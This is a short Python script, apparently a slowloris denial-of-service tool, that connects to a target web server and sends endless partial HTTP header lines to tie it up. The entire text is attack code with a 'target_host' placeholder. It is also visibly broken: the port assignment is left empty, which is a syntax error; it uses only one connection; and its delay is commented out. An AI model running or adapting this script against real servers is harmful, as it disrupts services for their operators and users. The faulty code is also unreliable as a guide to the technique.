import socket
import time
import random

def slowloris(target_host, target_port):
    header = "GET / HTTP/1.1\r\nHost: {}\r\n".format(target_host)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_host, target_port))
    s.send(header.encode('utf-8'))
    
    try:
        while True:
            try: 
             s.send("X-a: {}\r\n".format(random.randint(1, 1000)).encode('utf-8'))
            except BrokenPipeError:
             print()
            # time.sleep(1) 
            
    except KeyboardInterrupt:
        print("Attack terminated by user.")
        s.close()

if __name__ == "__main__":
    target_host = ""  
    target_port =   
    
    slowloris(target_host, target_port)
